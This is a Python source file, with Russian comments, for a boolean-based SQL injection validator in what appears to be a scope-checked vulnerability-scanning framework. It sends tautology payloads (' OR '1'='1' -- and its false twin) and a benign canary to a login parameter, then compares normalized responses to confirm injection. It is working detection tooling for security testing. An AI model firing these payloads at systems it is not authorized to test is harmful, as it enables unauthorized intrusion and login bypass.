"""SQL Injection — boolean-based differential, echo-immune, benign-controlled.

PASS только если: TRUE≠FALSE ПОСЛЕ нормализации (вырезаны payload/canary/
dynamic tokens), FALSE похож на benign, TRUE отличается от benign. status_diff
→ confidence 0.90, body-only diff после norm → 0.65. Заметки о disform-fix — в PR.
"""

from __future__ import annotations

import re
import secrets
import time
from typing import Any

import httpx

from orchestrator.types import Candidate, ValidatorContext, Verdict
from tools.core.vulnerability_class import VulnerabilityClass
from tools.validators import registry
from tools.validators.base import (
    BaseValidator,
    PayloadVariant,
    ValidationEvidence,
    check_scope,
)

_NAME = "sqli_boolean_v1"
_SUCCESS_STATUS = frozenset({200, 201, 202, 203, 204, 206, 301, 302, 303, 307, 308})
_TRUE_PAYLOAD = "' OR '1'='1' -- "
_FALSE_PAYLOAD = "' OR '1'='2' -- "

_DYNAMIC_TOKEN_PATTERNS: tuple[re.Pattern[bytes], ...] = (
    re.compile(rb'<meta\s+name="csrf-token"\s+content="[^"]*"\s*/?>', re.IGNORECASE),
    re.compile(
        rb'<input[^>]*name=["\'](?:csrf|_token|authenticity_token)[^>]*value=["\'][^"\']*["\'][^>]*>',
        re.IGNORECASE,
    ),
    re.compile(rb'nonce=["\'][^"\']+["\']', re.IGNORECASE),
    re.compile(rb"[?&](?:ts|_ts|t|_)=\d{6,}"),
    re.compile(rb"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?(?:Z|[+-]\d{2}:?\d{2})?"),
    re.compile(rb"\b[0-9a-fA-F]{32,}\b"),
)


def _canary(prefix: str) -> str:
    return f"{prefix}_{secrets.token_hex(8)}"


def _normalize_body(body: bytes, remove: list[str]) -> bytes:
    normalized = body
    for needle in remove:
        if needle:
            normalized = normalized.replace(needle.encode("utf-8", errors="replace"), b"")
    for pattern in _DYNAMIC_TOKEN_PATTERNS:
        normalized = pattern.sub(b"", normalized)
    return normalized


@registry.register(VulnerabilityClass.SQLI)
class SQLiValidator(BaseValidator):
    """Boolean-based SQLi с benign-control, echo-immune body diff."""

    @property
    def name(self) -> str:
        return _NAME

    @property
    def vulnerability_class(self) -> VulnerabilityClass:
        return VulnerabilityClass.SQLI

    def generate_payload(self, variant: PayloadVariant) -> str:
        return _TRUE_PAYLOAD if variant == "true" else _FALSE_PAYLOAD

    def compare_responses(self, resp_true: Any, resp_false: Any) -> bool:
        if not (isinstance(resp_true, dict) and isinstance(resp_false, dict)):
            return False
        st_t = int(resp_true.get("status", 0))
        st_f = int(resp_false.get("status", 0))
        if st_t != st_f:
            return True
        norm_t = resp_true.get("sha256_norm")
        norm_f = resp_false.get("sha256_norm")
        if norm_t and norm_f:
            return bool(norm_t != norm_f)
        return False

    def validate(self, candidate: Candidate, ctx: ValidatorContext) -> Verdict:
        try:
            oos = check_scope(ctx, candidate.target)
            if oos == "out_of_scope":
                return self._out_of_scope_verdict(candidate.target)

            transport = ctx.extra.get("http_transport") if ctx.extra else None
            with httpx.Client(
                transport=transport,
                timeout=10.0,
                verify=ctx.tls_verify,
                follow_redirects=False,
            ) as client:
                pt = self.generate_payload("true")
                pf = self.generate_payload("false")
                bng_user = _canary("bng")
                bng_pw = _canary("pw")

                rt = self._send(client, candidate, ctx, pt)
                rf = self._send(client, candidate, ctx, pf)
                rc = self._send(client, candidate, ctx, bng_user, pw_value=bng_pw)

                strip_list = [pt, pf, bng_user, bng_pw]
                norm_t = _normalize_body(rt["body"], strip_list)
                norm_f = _normalize_body(rf["body"], strip_list)
                norm_c = _normalize_body(rc["body"], strip_list)

                sha_norm_t = ValidationEvidence.sha256_of(norm_t)
                sha_norm_f = ValidationEvidence.sha256_of(norm_f)
                sha_norm_c = ValidationEvidence.sha256_of(norm_c)

                st_t, st_f, st_c = int(rt["status"]), int(rf["status"]), int(rc["status"])
                status_diff = st_t != st_f
                body_diff_after_norm = sha_norm_t != sha_norm_f
                normalized_diff = status_diff or body_diff_after_norm
                true_differs_from_benign = (st_t != st_c) or (sha_norm_t != sha_norm_c)
                false_like_benign = (st_f == st_c) and (sha_norm_f == sha_norm_c)

                is_real = False
                confidence = 0.0
                if not normalized_diff:
                    reason = "no_boolean_diff"
                    diff_reason = "no_diff_after_normalization"
                elif not true_differs_from_benign:
                    reason = "true_matches_benign"
                    diff_reason = "true_indistinguishable_from_benign"
                elif not false_like_benign:
                    reason = "false_does_not_match_benign"
                    diff_reason = "false_diverges_from_benign_control"
                elif status_diff:
                    is_real = True
                    reason = "boolean_diff_confirmed"
                    diff_reason = "status_differential"
                    confidence = 0.90
                else:
                    is_real = True
                    reason = "boolean_diff_confirmed"
                    diff_reason = "body_differential_after_normalization"
                    confidence = 0.65

                ev = ValidationEvidence(
                    payload_true=pt,
                    payload_false=pf,
                    payload_benign=f"{bng_user}:{bng_pw}",
                    status_true=st_t,
                    status_false=st_f,
                    status_benign=st_c,
                    len_true=int(rt["len"]),
                    len_false=int(rf["len"]),
                    len_benign=int(rc["len"]),
                    sha256_true=str(rt["sha256"]),
                    sha256_false=str(rf["sha256"]),
                    sha256_benign=str(rc["sha256"]),
                    timing_ms_true=float(rt["timing_ms"]),
                    timing_ms_false=float(rf["timing_ms"]),
                    timing_ms_benign=float(rc["timing_ms"]),
                    diff_reason=diff_reason,
                    normalized_diff=normalized_diff,
                    false_like_benign=false_like_benign,
                    true_differs_from_benign=true_differs_from_benign,
                    extra={
                        "sha256_norm_true": sha_norm_t,
                        "sha256_norm_false": sha_norm_f,
                        "sha256_norm_benign": sha_norm_c,
                        "status_differential": status_diff,
                        "body_differential_after_norm": body_diff_after_norm,
                        "true_in_success_family": st_t in _SUCCESS_STATUS,
                        "false_in_success_family": st_f in _SUCCESS_STATUS,
                    },
                )

                if is_real:
                    evidence_text = (
                        f"SQLi boolean-diff подтверждён на "
                        f"{candidate.param or '?'}@{candidate.path}: "
                        f"TRUE→HTTP {st_t}, FALSE→HTTP {st_f}, benign→HTTP {st_c}. "
                        f"diff_reason={diff_reason}, "
                        f"false_like_benign={false_like_benign}, "
                        f"true_differs_from_benign={true_differs_from_benign}."
                    )
                else:
                    evidence_text = (
                        f"SQLi boolean-diff НЕ подтверждён на "
                        f"{candidate.param or '?'}@{candidate.path}: "
                        f"TRUE→{st_t}, FALSE→{st_f}, benign→{st_c} ({reason})"
                    )

                return Verdict(
                    is_real=is_real,
                    evidence=evidence_text,
                    confidence=confidence,
                    bug_class=self.vulnerability_class.value,
                    validator=self.name,
                    reason=reason,
                    replays_passed=1 if is_real else 0,
                    replays_total=1,
                    artifacts=ev.to_dict(),
                )
        except Exception as e:
            return self.as_failure(e)

    def _send(
        self,
        client: httpx.Client,
        candidate: Candidate,
        ctx: ValidatorContext,
        inj_value: str,
        pw_value: str | None = None,
    ) -> dict[str, Any]:
        base = ctx.target.rstrip("/")
        path = candidate.path or "/"
        method = (candidate.method or "POST").upper()
        param = candidate.param or "username"
        pw_param = candidate.meta.get("password_param", "password")
        pw = pw_value if pw_value is not None else candidate.meta.get("password_value", "x")
        ctype = str(candidate.meta.get("content_type", "form")).lower()
        headers = {**(ctx.program_headers or {}), **(candidate.headers or {})}

        params: dict[str, str] = {param: inj_value}
        if pw_param:
            params[pw_param] = pw
        extra_fields = candidate.meta.get("extra_fields") or {}
        if isinstance(extra_fields, dict):
            for k, v in extra_fields.items():
                params[str(k)] = str(v)

        url = base + path
        start = time.monotonic()
        if method == "GET":
            resp = client.get(url, params=params, headers=headers)
        elif ctype == "json":
            resp = client.request(method, url, json=params, headers=headers)
        else:
            resp = client.request(method, url, data=params, headers=headers)
        elapsed_ms = round((time.monotonic() - start) * 1000.0, 3)

        body = resp.content or b""
        return {
            "status": resp.status_code,
            "body": body,
            "len": len(body),
            "sha256": ValidationEvidence.sha256_of(body),
            "timing_ms": elapsed_ms,
        }
